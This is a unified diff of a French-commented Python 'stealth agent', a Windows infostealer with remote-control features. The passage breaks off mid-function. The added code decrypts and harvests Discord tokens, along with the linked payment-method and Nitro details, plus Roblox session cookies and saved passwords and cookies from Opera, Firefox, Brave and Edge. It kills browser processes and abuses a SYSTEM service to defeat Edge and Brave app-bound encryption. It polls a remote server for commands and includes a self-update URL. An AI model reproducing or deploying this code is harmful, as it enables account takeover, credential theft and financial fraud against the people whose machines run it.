@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-# client.pyw - Agent furtif avec collecte complète (Discord, Roblox, navigateurs, etc.)
+# client.py - Agent furtif avec collecte complète (Discord, Roblox, navigateurs, etc.)
 
 # ========== PHASE 1 : IMPORTS MINIMAUX POUR INSTALLATION ==========
 import os
@@ -48,7 +48,6 @@ def check_and_install_dependencies():
     if missing:
         for pkg in missing:
             install_package(pkg)
-        # Redémarrage après installation
         subprocess.Popen([sys.executable] + sys.argv)
         sys.exit(0)
 
@@ -81,14 +80,13 @@ import mss.tools
 from pypsexec.client import Client
 
 # ========== CONFIGURATION ==========
-SERVER_URL = "https://serveur-distance.onrender.com"  # À remplacer
-HEARTBEAT_INTERVAL = 300      # 5 minutes
-COMMAND_POLL_INTERVAL = 30    # 30 secondes
+SERVER_URL = "http://127.0.0.1:5000"
+HEARTBEAT_INTERVAL = 300
+COMMAND_POLL_INTERVAL = 30
 CONFIG_FILE = "client_config.txt"
 VERSION_URL = "https://raw.githubusercontent.com/votre-repo/client/version.txt"
 UPDATE_URL = "https://raw.githubusercontent.com/votre-repo/client/client.pyw"
 
-# Constantes pour token Discord
 PATHS = {
     'Discord': os.getenv('APPDATA') + '\\discord',
     'Discord Canary': os.getenv('APPDATA') + '\\discordcanary',
@@ -104,20 +102,23 @@ BROWSER_PROCESS_NAMES = {
     'firefox':  ['firefox.exe']
 }
 
+EXCLUDE_DOMAINS = ['.msn.com', 'assets.msn.com', 'ntp.msn.com', 'srtb.msn.com']
 IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0
+MACHINE_ID = None
 
 def get_machine_id():
-    """Identifiant unique de la machine"""
+    global MACHINE_ID
+    if MACHINE_ID:
+        return MACHINE_ID
     try:
         import winreg
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
-        machine_guid = winreg.QueryValueEx(key, "MachineGuid")[0]
+        MACHINE_ID = winreg.QueryValueEx(key, "MachineGuid")[0]
         winreg.CloseKey(key)
-        return machine_guid
+        return MACHINE_ID
     except:
-        return os.getenv('COMPUTERNAME', 'unknown')
-
-MACHINE_ID = get_machine_id()
+        MACHINE_ID = os.getenv('COMPUTERNAME', 'unknown')
+        return MACHINE_ID
 
 # ========== GESTION CONFIGURATION ==========
 def load_config():
@@ -141,7 +142,90 @@ def set_config(key, value):
     cfg[key] = value
     save_config(cfg)
 
-# ========== FONCTIONS DE COLLECTE (issus du grabber original) ==========
+# ========== FONCTIONS SYSTÈME ==========
+def format_bytes(n):
+    if n == 0:
+        return "0 B"
+    units = ['B','KB','MB','GB','TB']
+    i = 0
+    while n >= 1024 and i < len(units)-1:
+        n /= 1024
+        i += 1
+    return f"{n:.1f} {units[i]}"
+
+def get_public_ip():
+    try:
+        r = requests.get('https://api.ipify.org?format=json', timeout=5)
+        return r.json().get('ip', 'Unknown')
+    except:
+        return 'Unknown'
+
+def get_windows_version():
+    try:
+        import platform
+        import winreg
+        ver = platform.win32_ver()
+        release = ver[0]
+        build = ver[1]
+        edition = ""
+        try:
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
+            edition = winreg.QueryValueEx(key, "EditionID")[0]
+            winreg.CloseKey(key)
+        except:
+            pass
+        if edition:
+            return f"Windows {release} {edition} (Build {build.split('.')[-1]})"
+        else:
+            return f"Windows {release} (Build {build.split('.')[-1]})"
+    except:
+        return "Unknown"
+
+def get_disk_usage():
+    try:
+        usage = psutil.disk_usage('/')
+        return {
+            'total': usage.total,
+            'free': usage.free,
+            'used': usage.used,
+            'percent': usage.percent,
+            'total_str': format_bytes(usage.total),
+            'free_str': format_bytes(usage.free),
+            'used_str': format_bytes(usage.used)
+        }
+    except:
+        return {'total':0,'free':0,'used':0,'percent':0}
+
+def get_memory_info():
+    try:
+        mem = psutil.virtual_memory()
+        return {
+            'total': mem.total,
+            'available': mem.available,
+            'used': mem.used,
+            'percent': mem.percent,
+            'total_str': format_bytes(mem.total),
+            'available_str': format_bytes(mem.available),
+            'used_str': format_bytes(mem.used)
+        }
+    except:
+        return {'total':0,'available':0,'used':0,'percent':0}
+
+def get_system_info():
+    disk = get_disk_usage()
+    ram = get_memory_info()
+    return {
+        'machine_id': get_machine_id(),
+        'computer_name': os.getenv('COMPUTERNAME', ''),
+        'username': os.getenv('USERNAME', ''),
+        'windows_version': get_windows_version(),
+        'disk': disk,
+        'ram': ram,
+        'ip': get_public_ip(),
+        'timestamp': datetime.now(timezone.utc).isoformat()
+    }
+
+# ========== BROWSER TOOLS ==========
 def getheaders(token=None):
     headers = {
         "Content-Type": "application/json",
@@ -173,167 +257,17 @@ def getkey(path):
         key = json.load(f)['os_crypt']['encrypted_key']
     return key
 
-def get_public_ip():
-    try:
-        r = requests.get('https://api.ipify.org?format=json', timeout=5)
-        return r.json().get('ip', 'Unknown')
-    except:
-        return 'Unknown'
-
-def get_windows_version():
-    try:
-        import platform
-        ver = platform.win32_ver()
-        return f"{ver[0]} {ver[1]}"
-    except:
-        return "Unknown"
-
-def get_disk_usage():
-    try:
-        usage = psutil.disk_usage('/')
-        return {'total': usage.total, 'free': usage.free, 'used': usage.used, 'percent': usage.percent}
-    except:
-        return {'total': 0, 'free': 0, 'used': 0, 'percent': 0}
-
-def get_memory_info():
-    try:
-        mem = psutil.virtual_memory()
-        return {'total': mem.total, 'available': mem.available, 'used': mem.used, 'percent': mem.percent}
-    except:
-        return {'total': 0, 'available': 0, 'used': 0, 'percent': 0}
-
-def get_system_info():
-    return {
-        'machine_id': MACHINE_ID,
-        'computer_name': os.getenv('COMPUTERNAME', ''),
-        'username': os.getenv('USERNAME', ''),
-        'windows_version': get_windows_version(),
-        'disk': get_disk_usage(),
-        'ram': get_memory_info(),
-        'ip': get_public_ip(),
-        'timestamp': datetime.now(timezone.utc).isoformat()
-    }
-
-# --- Discord tokens ---
-def get_discord_tokens():
-    result = []
-    checked = []
-    for platform, path in PATHS.items():
-        if not os.path.exists(path):
-            continue
-        for token_enc in gettokens(path):
-            token_enc = token_enc.replace("\\", "")
-            try:
-                key = getkey(path)
-                decrypted_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
-                encrypted_token = token_enc.split('dQw4w9WgXcQ:')[1]
-                nonce = base64.b64decode(encrypted_token)[3:15]
-                ciphertext = base64.b64decode(encrypted_token)[15:]
-                token = AES.new(decrypted_key, AES.MODE_GCM, nonce).decrypt(ciphertext)[:-16].decode()
-                if token in checked:
-                    continue
-                checked.append(token)
-                # Récupérer infos user
-                headers = getheaders(token)
-                r = requests.get('https://discord.com/api/v10/users/@me', headers=headers, timeout=10)
-                if r.status_code != 200:
-                    continue
-                user = r.json()
-                # Guilds
-                r_guilds = requests.get('https://discordapp.com/api/v6/users/@me/guilds', headers=headers, timeout=10)
-                guilds = r_guilds.json() if r_guilds.status_code == 200 else []
-                admin_guilds = []
-                for g in guilds:
-                    if g.get('permissions', 0) & 0x8:  # ADMINISTRATOR
-                        try:
-                            rg = requests.get(f'https://discordapp.com/api/v6/guilds/{g["id"]}', headers=headers, timeout=10)
-                            if rg.status_code == 200:
-                                gdata = rg.json()
-                                admin_guilds.append({
-                                    'name': gdata.get('name'),
-                                    'id': gdata.get('id'),
-                                    'member_count': gdata.get('approximate_member_count'),
-                                    'vanity': gdata.get('vanity_url_code')
-                                })
-                            else:
-                                admin_guilds.append({'name': g.get('name'), 'id': g.get('id')})
-                        except:
-                            admin_guilds.append({'name': g.get('name'), 'id': g.get('id')})
-                # Nitro
-                r_nitro = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers, timeout=10)
-                nitro = r_nitro.json() if r_nitro.status_code == 200 else []
-                has_nitro = len(nitro) > 0
-                expiry = nitro[0].get('current_period_end') if has_nitro else None
-                # Boosts
-                r_boosts = requests.get('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=headers, timeout=10)
-                boosts = r_boosts.json() if r_boosts.status_code == 200 else []
-                available_boosts = sum(1 for s in boosts if datetime.fromisoformat(s['cooldown_ends_at'].replace('Z', '+00:00')) <= datetime.now(timezone.utc))
-                # Payment methods
-                r_payments = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers, timeout=10)
-                payments = r_payments.json() if r_payments.status_code == 200 else []
-                payment_methods = []
-                for p in payments:
-                    if p['type'] == 1:
-                        payment_methods.append({'type': 'CreditCard', 'invalid': p.get('invalid', False)})
-                    elif p['type'] == 2:
-                        payment_methods.append({'type': 'PayPal', 'invalid': p.get('invalid', False)})
-                result.append({
-                    'token': token,
-                    'user_id': user.get('id'),
-                    'username': user.get('username'),
-                    'discriminator': user.get('discriminator'),
-                    'email': user.get('email'),
-                    'phone': user.get('phone'),
-                    'mfa_enabled': user.get('mfa_enabled'),
-                    'verified': user.get('verified'),
-                    'flags': user.get('flags'),
-                    'guilds_count': len(guilds),
-                    'admin_guilds': admin_guilds,
-                    'has_nitro': has_nitro,
-                    'nitro_expiry': expiry,
-                    'available_boosts': available_boosts,
-                    'payment_methods': payment_methods,
-                    'platform': platform
-                })
-            except Exception as e:
-                continue
-    return result
-
-# --- Roblox cookie ---
-def get_roblox_cookie_and_username():
-    try:
-        profile = os.getenv("USERPROFILE")
-        path = os.path.join(profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
-        if not os.path.exists(path):
-            return None
-        with open(path, 'r', encoding='utf-8') as f:
-            data = json.load(f)
-        encoded = data["CookiesData"]
-        decoded = base64.b64decode(encoded)
-        decrypted = win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]
-        cookies_str = decrypted.decode('utf-8', errors='ignore')
-        for line in cookies_str.split(';'):
-            if '.ROBLOSECURITY' in line:
-                cookie = line.split('=', 1)[1].strip()
-                if not cookie.startswith('_|WARNING:'):
-                    continue
-                # Récupérer username
-                session = requests.Session()
-                session.headers.update({"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Roblox/WinInet"})
-                r = session.get("https://users.roblox.com/v1/users/authenticated", timeout=8)
-                if r.status_code == 200:
-                    username = r.json().get("name")
-                    return {'cookie': cookie, 'username': username}
-                return {'cookie': cookie, 'username': None}
-        return None
-    except:
-        return None
-
-# --- Navigateurs (mots de passe et cookies) ---
 def kill_browser_process(browser_key):
     if browser_key not in BROWSER_PROCESS_NAMES:
         return
+    procs = [p.info for p in psutil.process_iter(['pid', 'name']) if p.info['name']]
     for name in BROWSER_PROCESS_NAMES[browser_key]:
+        for proc in procs:
+            if proc['name'].lower() == name.lower():
+                try:
+                    psutil.Process(proc['pid']).terminate()
+                except:
+                    pass
         try:
             subprocess.call(f"taskkill /f /im {name} /t", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except:
@@ -357,7 +291,7 @@ def get_browser_encryption_key(base_path):
         return None
 
 def decrypt_value(enc_value, key):
-    if not key:
+    if not key or not enc_value:
         return None
     try:
         if enc_value[:3] in (b'v10', b'v11', b'v20'):
@@ -376,10 +310,7 @@ def extract_chromium_browser(browser_name, base_path, key_func=None):
     result = {'passwords': [], 'cookies': []}
     if not os.path.exists(base_path):
         return result
-    if key_func:
-        key = key_func(base_path)
-    else:
-        key = get_browser_encryption_key(base_path)
+    key = key_func(base_path) if key_func else get_browser_encryption_key(base_path)
     if not key:
         return result
     profiles = []
@@ -391,8 +322,8 @@ def extract_chromium_browser(browser_name, base_path, key_func=None):
             prof_path = os.path.join(base_path, item)
             if os.path.exists(os.path.join(prof_path, "Login Data")):
                 profiles.append((item, prof_path))
-    # Mots de passe
     for profile_name, profile_path in profiles:
+        # Mots de passe
         login_db = os.path.join(profile_path, "Login Data")
         if os.path.exists(login_db):
             try:
@@ -424,8 +355,7 @@ def extract_chromium_browser(browser_name, base_path, key_func=None):
                 shutil.copy2(cookie_path, tmp.name)
                 conn = sqlite3.connect(tmp.name)
                 for host, name, path, enc_val, expires, secure, httponly in conn.execute(
-                    "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies"
-                ):
+                    "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies"):
                     val = decrypt_value(enc_val, key)
                     if val:
                         result['cookies'].append({
@@ -445,7 +375,7 @@ def extract_chromium_browser(browser_name, base_path, key_func=None):
                 pass
     return result
 
-# Firefox
+# ========== FIREFOX ==========
 class NSSProxy:
     class SECItem(ctypes.Structure):
         _fields_ = [("type", ctypes.c_uint), ("data", ctypes.c_char_p), ("len", ctypes.c_uint)]
@@ -470,7 +400,7 @@ class NSSProxy:
             finally:
                 os.chdir(workdir)
         if self.libnss is None:
-            raise Exception("NSS library not found")
+            raise Exception("NSS not found")
         for name, restype, *argtypes in [
             ("NSS_Init", ctypes.c_int, ctypes.c_char_p),
             ("NSS_Shutdown", ctypes.c_int),
@@ -537,7 +467,6 @@ def extract_firefox_data():
             moz = NSSProxy()
             moz.initialize(profile_path)
             moz.authenticate(profile_name)
-            # Logins
             logins_json = os.path.join(profile_path, "logins.json")
             if os.path.exists(logins_json):
                 with open(logins_json, "r", encoding="utf-8") as f:
@@ -556,7 +485,6 @@ def extract_firefox_data():
                             })
                     except:
                         pass
-            # Cookies
             cookie_db = os.path.join(profile_path, "cookies.sqlite")
             if os.path.exists(cookie_db):
                 tmp = tempfile.NamedTemporaryFile(delete=False)
@@ -581,10 +509,10 @@ def extract_firefox_data():
                 os.unlink(tmp.name)
             moz.shutdown()
         except:
-            continue
+            pass
     return result
 
-# Brave (app-bound key avec pypsexec)
+# ========== BRAVE & EDGE (admin) ==========
 def get_brave_app_bound_key(local_state_path):
     if not os.path.exists(local_state_path) or not IS_ADMIN:
         return None
@@ -595,47 +523,41 @@ def get_brave_app_bound_key(local_state_path):
         if not app_bound_encrypted_key:
             return None
         decrypt_script = """
-import win32crypt
-import binascii
+import win32crypt, binascii
 encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
 print(binascii.b2a_base64(encrypted_key[1]).decode())
 """
-        try:
-            c = Client("localhost")
-            c.connect()
-            c.create_service()
-            app_bound_key = binascii.a2b_base64(app_bound_encrypted_key)
-            if app_bound_key[:4] == b"APPB":
-                app_bound_key = app_bound_key[4:]
-            app_bound_encrypted_key_b64 = binascii.b2a_base64(app_bound_key).decode().strip()
-            encrypted_key_b64, _, rc = c.run_executable(
-                sys.executable,
-                arguments=f'-c "{decrypt_script.format(app_bound_encrypted_key_b64)}"',
-                use_system_account=True
-            )
-            if rc != 0:
-                return None
-            decrypted_key_b64, _, rc = c.run_executable(
-                sys.executable,
-                arguments=f'-c "{decrypt_script.format(encrypted_key_b64.decode().strip())}"',
-                use_system_account=False
-            )
-            if rc != 0:
-                return None
-            decrypted_key = binascii.a2b_base64(decrypted_key_b64)
-            if len(decrypted_key) < 32:
-                return None
-            return decrypted_key[-32:]
-        except:
+        c = Client("localhost")
+        c.connect()
+        c.create_service()
+        app_bound_key = binascii.a2b_base64(app_bound_encrypted_key)
+        if app_bound_key[:4] == b"APPB":
+            app_bound_key = app_bound_key[4:]
+        app_bound_encrypted_key_b64 = binascii.b2a_base64(app_bound_key).decode().strip()
+        encrypted_key_b64, _, rc = c.run_executable(
+            sys.executable,
+            arguments=f'-c "{decrypt_script.format(app_bound_encrypted_key_b64)}"',
+            use_system_account=True
+        )
+        if rc != 0:
             return None
-        finally:
-            try:
-                c.remove_service()
-            except:
-                pass
-            c.disconnect()
+        decrypted_key_b64, _, rc = c.run_executable(
+            sys.executable,
+            arguments=f'-c "{decrypt_script.format(encrypted_key_b64.decode().strip())}"',
+            use_system_account=False
+        )
+        if rc != 0:
+            return None
+        decrypted_key = binascii.a2b_base64(decrypted_key_b64)
+        if len(decrypted_key) < 32:
+            return None
+        return decrypted_key[-32:]
     except:
         return None
+    finally:
+        try: c.remove_service()
+        except: pass
+        c.disconnect()
 
 def extract_brave_data():
     if not IS_ADMIN:
@@ -651,7 +573,17 @@ def extract_brave_data():
         return {'passwords': [], 'cookies': []}
     return extract_chromium_browser('Brave', brave_path, lambda x: key)
 
-# Edge (app-bound)
+def wait_for_file_unlock(file_path, max_attempts=10):
+    for _ in range(max_attempts):
+        try:
+            test_path = file_path + ".test"
+            shutil.copy2(file_path, test_path)
+            os.remove(test_path)
+            return True
+        except:
+            time.sleep(2)
+    return False
+
 def get_edge_app_bound_key(local_state_path):
     if not os.path.exists(local_state_path) or not IS_ADMIN:
         return None
@@ -662,45 +594,54 @@ def get_edge_app_bound_key(local_state_path):
         if not app_bound_encrypted_key:
             return None
         decrypt_script = """
-import win32crypt
-import binascii
+import win32crypt, binascii
 encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
 print(binascii.b2a_base64(encrypted_key[1]).decode())
 """
-        try:
-            c = Client("localhost")
-            c.connect()
-            c.create_service()
-            app_bound_key = binascii.a2b_base64(app_bound_encrypted_key)
-            if app_bound_key[:4] == b"APPB":
-                app_bound_key = app_bound_key[4:]
-            app_bound_encrypted_key_b64 = binascii.b2a_base64(app_bound_key).decode().strip()
-            encrypted_key_b64, _, rc = c.run_executable(
-                sys.executable,
-                arguments=f'-c "{decrypt_script.format(app_bound_encrypted_key_b64)}"',
-                use_system_account=True
-            )
-            if rc != 0:
-                return None
-            decrypted_key_b64, _, rc = c.run_executable(
-                sys.executable,
-                arguments=f'-c "{decrypt_script.format(encrypted_key_b64.decode().strip())}"',
-                use_system_account=False
-            )
-            if rc != 0:
-                return None
-            decrypted_key = binascii.a2b_base64(decrypted_key_b64)
-            if len(decrypted_key) < 32:
-                return None
-            return decrypted_key[-32:]
-        except:
+        c = Client("localhost")
+        c.connect()
+        c.create_service()
+        app_bound_key = binascii.a2b_base64(app_bound_encrypted_key)
+        if app_bound_key[:4] == b"APPB":
+            app_bound_key = app_bound_key[4:]
+        app_bound_encrypted_key_b64 = binascii.b2a_base64(app_bound_key).decode().strip()
+        encrypted_key_b64, _, rc = c.run_executable(
+            sys.executable,
+            arguments=f'-c "{decrypt_script.format(app_bound_encrypted_key_b64)}"',
+            use_system_account=True
+        )
+        if rc != 0:
             return None
-        finally:
-            try:
-                c.remove_service()
-            except:
-                pass
-            c.disconnect()
+        decrypted_key_b64, _, rc = c.run_executable(
+            sys.executable,
+            arguments=f'-c "{decrypt_script.format(encrypted_key_b64.decode().strip())}"',
+            use_system_account=False
+        )
+        if rc != 0:
+            return None
+        decrypted_key = binascii.a2b_base64(decrypted_key_b64)
+        if len(decrypted_key) < 32:
+            return None
+        return decrypted_key[-32:]
+    except:
+        return None
+    finally:
+        try: c.remove_service()
+        except: pass
+        c.disconnect()
+
+def get_standard_edge_key(edge_user_data_path):
+    local_state = os.path.join(edge_user_data_path, "Local State")
+    if not os.path.exists(local_state):
+        return None
+    try:
+        with open(local_state, "r", encoding="utf-8") as f:
+            state = json.load(f)
+        encrypted_key_b64 = state.get("os_crypt", {}).get("encrypted_key")
+        if not encrypted_key_b64:
+            return None
+        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
     except:
         return None
 
@@ -713,45 +654,285 @@ def extract_edge_data():
     kill_browser_process('edge')
     key = get_edge_app_bound_key(os.path.join(edge_path, 'Local State'))
     if not key:
-        key = get_browser_encryption_key(edge_path)
+        key = get_standard_edge_key(edge_path)
     if not key:
         return {'passwords': [], 'cookies': []}
-    return extract_chromium_browser('Edge', edge_path, lambda x: key)
 
-def collect_all_browsers_data():
     all_passwords = []
     all_cookies = []
-    # Opera
-    opera_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable")
-    if os.path.exists(opera_path):
-        data = extract_chromium_browser('Opera', opera_path)
-        all_passwords.extend(data['passwords'])
-        all_cookies.extend(data['cookies'])
-    # Opera GX
-    operagx_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable")
-    if os.path.exists(operagx_path):
-        data = extract_chromium_browser('Opera GX', operagx_path)
-        all_passwords.extend(data['passwords'])
-        all_cookies.extend(data['cookies'])
-    # Firefox
-    ff_data = extract_firefox_data()
-    all_passwords.extend(ff_data['passwords'])
-    all_cookies.extend(ff_data['cookies'])
-    # Brave
-    brave_data = extract_brave_data()
-    all_passwords.extend(brave_data['passwords'])
-    all_cookies.extend(brave_data['cookies'])
-    # Edge
-    edge_data = extract_edge_data()
-    all_passwords.extend(edge_data['passwords'])
-    all_cookies.extend(edge_data['cookies'])
+
+    def decrypt_v20(enc_val, k):
+        try:
+            if enc_val[:3] != b'v20':
+                return None
+            nonce = enc_val[3:15]
+            tag = enc_val[-16:]
+            data = enc_val[15:-16]
+            cipher = AES.new(k, AES.MODE_GCM, nonce=nonce)
+            decrypted = cipher.decrypt_and_verify(data, tag)
+            if len(decrypted) > 32:
+                return decrypted[32:].decode('utf-8', errors='ignore')
+            return decrypted.decode('utf-8', errors='ignore')
+        except:
+            return None
+
+    def decrypt_v10(enc_val, k=None):
+        try:
+            return win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode("utf-8")
+        except:
+            return None
+
+    profiles = []
+    for item in os.listdir(edge_path):
+        prof_path = os.path.join(edge_path, item)
+        if os.path.isdir(prof_path) and (os.path.exists(os.path.join(prof_path, "Login Data")) or os.path.exists(os.path.join(prof_path, "Network", "Cookies"))):
+            profiles.append((item, prof_path))
+
+    for profile_name, profile_path in profiles:
+        login_db = os.path.join(profile_path, "Login Data")
+        if os.path.exists(login_db):
+            try:
+                tmp = tempfile.NamedTemporaryFile(delete=False)
+                tmp.close()
+                shutil.copy2(login_db, tmp.name)
+                conn = sqlite3.connect(tmp.name)
+                cur = conn.cursor()
+                cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")
+                if cur.fetchone():
+                    for origin_url, username, password_value in cur.execute("SELECT origin_url, username_value, password_value FROM logins"):
+                        if username and password_value:
+                            password = None
+                            if password_value[:3] == b'v20':
+                                password = decrypt_v20(password_value, key)
+                            if not password:
+                                password = decrypt_v10(password_value)
+                            if password:
+                                all_passwords.append({'browser':'Edge','profile':profile_name,'url':origin_url,'username':username,'password':password})
+                conn.close()
+                os.unlink(tmp.name)
+            except:
+                pass
+        cookie_db = os.path.join(profile_path, "Network", "Cookies")
+        if os.path.exists(cookie_db) and wait_for_file_unlock(cookie_db):
+            try:
+                tmp = tempfile.NamedTemporaryFile(delete=False)
+                tmp.close()
+                shutil.copy2(cookie_db, tmp.name)
+                conn = sqlite3.connect(tmp.name)
+                cur = conn.cursor()
+                cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")
+                if cur.fetchone():
+                    current_time = datetime.now(timezone.utc)
+                    for host_key, name, encrypted_value, expires_utc, is_secure, is_httponly, same_site in cur.execute(
+                        "SELECT host_key, name, CAST(encrypted_value AS BLOB), expires_utc, is_secure, is_httponly, sameSite FROM cookies"):
+                        if any(host_key.endswith(domain) for domain in EXCLUDE_DOMAINS):
+                            continue
+                        if expires_utc and expires_utc != 0:
+                            expires_dt = datetime.fromtimestamp(expires_utc / 1000000 - 11644473600, tz=timezone.utc)
+                            if expires_dt < current_time:
+                                continue
+                        else:
+                            expires_dt = None
+                        cookie_value = None
+                        if encrypted_value and encrypted_value[:3] == b'v20':
+                            cookie_value = decrypt_v20(encrypted_value, key)
+                        if not cookie_value:
+                            cookie_value = decrypt_v10(encrypted_value)
+                        if cookie_value:
+                            all_cookies.append({'browser':'Edge','profile':profile_name,'host':host_key.lstrip('.'),'name':name,'value':cookie_value,'expires':expires_dt.strftime('%Y-%m-%d %H:%M:%S') if expires_dt else 'Session','secure':bool(is_secure),'httponly':bool(is_httponly)})
+                conn.close()
+                os.unlink(tmp.name)
+            except:
+                pass
     return {'passwords': all_passwords, 'cookies': all_cookies}
 
-# --- Autres utilitaires ---
+# ========== COLLECTE COMPLÈTE ==========
+def collect_all_browsers_data():
+    all_pw = []
+    all_ck = []
+    # Opera
+    try:
+        opera_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable")
+        data = extract_chromium_browser('Opera', opera_path)
+        all_pw.extend(data['passwords'])
+        all_ck.extend(data['cookies'])
+    except: pass
+    # Opera GX
+    try:
+        operagx_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable")
+        data = extract_chromium_browser('Opera GX', operagx_path)
+        all_pw.extend(data['passwords'])
+        all_ck.extend(data['cookies'])
+    except: pass
+    # Firefox
+    try:
+        ff = extract_firefox_data()
+        all_pw.extend(ff['passwords'])
+        all_ck.extend(ff['cookies'])
+    except: pass
+    # Brave
+    try:
+        brave = extract_brave_data()
+        all_pw.extend(brave['passwords'])
+        all_ck.extend(brave['cookies'])
+    except: pass
+    # Edge
+    try:
+        edge = extract_edge_data()
+        all_pw.extend(edge['passwords'])
+        all_ck.extend(edge['cookies'])
+    except: pass
+    return {'passwords': all_pw, 'cookies': all_ck}
+
+# ========== DISCORD ==========
+def get_discord_tokens():
+    result = []
+    checked = []
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        for token_enc in gettokens(path):
+            token_enc = token_enc.replace("\\", "")
+            try:
+                key = getkey(path)
+                decrypted_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
+                encrypted_token = token_enc.split('dQw4w9WgXcQ:')[1]
+                nonce = base64.b64decode(encrypted_token)[3:15]
+                ciphertext = base64.b64decode(encrypted_token)[15:]
+                token = AES.new(decrypted_key, AES.MODE_GCM, nonce).decrypt(ciphertext)[:-16].decode()
+                if token in checked:
+                    continue
+                checked.append(token)
+                headers = getheaders(token)
+                r = requests.get('https://discord.com/api/v10/users/@me', headers=headers, timeout=10)
+                if r.status_code != 200:
+                    continue
+                user = r.json()
+                r_guilds = requests.get('https://discordapp.com/api/v6/users/@me/guilds?with_counts=true', headers=headers, timeout=10)
+                guilds = r_guilds.json() if r_guilds.status_code == 200 else []
+                admin_guilds = []
+                for g in guilds:
+                    if g.get('permissions', 0) & 0x8:
+                        try:
+                            rg = requests.get(f'https://discordapp.com/api/v6/guilds/{g["id"]}', headers=headers, timeout=10)
+                            if rg.status_code == 200:
+                                gdata = rg.json()
+                                admin_guilds.append({
+                                    'name': gdata.get('name'),
+                                    'id': gdata.get('id'),
+                                    'member_count': gdata.get('approximate_member_count'),
+                                    'vanity': gdata.get('vanity_url_code')
+                                })
+                            else:
+                                admin_guilds.append({'name': g.get('name'), 'id': g.get('id')})
+                        except:
+                            admin_guilds.append({'name': g.get('name'), 'id': g.get('id')})
+                r_nitro = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers, timeout=10)
+                nitro = r_nitro.json() if r_nitro.status_code == 200 else []
+                has_nitro = len(nitro) > 0
+                expiry = nitro[0].get('current_period_end') if has_nitro else None
+                r_boosts = requests.get('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=headers, timeout=10)
+                boosts = r_boosts.json() if r_boosts.status_code == 200 else []
+                available_boosts = sum(1 for s in boosts if datetime.fromisoformat(s['cooldown_ends_at'].replace('Z','+00:00')) <= datetime.now(timezone.utc))
+                r_payments = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers, timeout=10)
+                payments = r_payments.json() if r_payments.status_code == 200 else []
+                payment_methods = []
+                for p in payments:
+                    if p['type'] == 1:
+                        payment_methods.append({'type':'CreditCard','invalid':p.get('invalid',False)})
+                    elif p['type'] == 2:
+                        payment_methods.append({'type':'PayPal','invalid':p.get('invalid',False)})
+                result.append({
+                    'token': token,
+                    'user_id': user.get('id'),
+                    'username': user.get('username'),
+                    'discriminator': user.get('discriminator'),
+                    'email': user.get('email'),
+                    'phone': user.get('phone'),
+                    'mfa_enabled': user.get('mfa_enabled'),
+                    'verified': user.get('verified'),
+                    'flags': user.get('flags'),
+                    'guilds_count': len(guilds),
+                    'admin_guilds': admin_guilds,
+                    'has_nitro': has_nitro,
+                    'nitro_expiry': expiry,
+                    'available_boosts': available_boosts,
+                    'payment_methods': payment_methods,
+                    'platform': platform
+                })
+            except:
+                continue
+    return result
+
+# ========== ROBLOX COOKIE (copie fichier améliorée) ==========
+def get_roblox_cookie_and_username():
+    try:
+        profile = os.getenv("USERPROFILE")
+        roblox_path = os.path.join(profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
+        if not os.path.exists(roblox_path):
+            return None
+        # Copie vers un fichier temporaire pour éviter les verrous
+        tmp_dir = os.getenv("TEMP") or os.path.expanduser("~\\AppData\\Local\\Temp")
+        dest = os.path.join(tmp_dir, f"rc_{datetime.now():%Y%m%d_%H%M%S}.dat")
+        shutil.copy(roblox_path, dest)
+        data = None
+        try:
+            with open(dest, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+        except:
+            pass
+        finally:
+            if os.path.exists(dest):
+                try:
+                    os.remove(dest)
+                except:
+                    pass
+        if not data or "CookiesData" not in data:
+            return None
+        encoded = data["CookiesData"]
+        decoded = base64.b64decode(encoded)
+        decrypted = win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]
+        cookies_str = decrypted.decode('utf-8', errors='ignore')
+        for line in cookies_str.split(';'):
+            line = line.strip()
+            if '.ROBLOSECURITY' in line:
+                cookie_value = line.split('=', 1)[1].strip() if '=' in line else line.split('.ROBLOSECURITY')[-1].strip()
+                # Nettoyer les préfixes comme #HttpOnly_
+                parts = cookie_value.split()
+                cookie_value = parts[-1] if parts else cookie_value
+                if not cookie_value.startswith('_|WARNING:'):
+                    continue
+                # Récupération du username avec gestion CSRF
+                session = requests.Session()
+                session.headers.update({
+                    "Cookie": f".ROBLOSECURITY={cookie_value}",
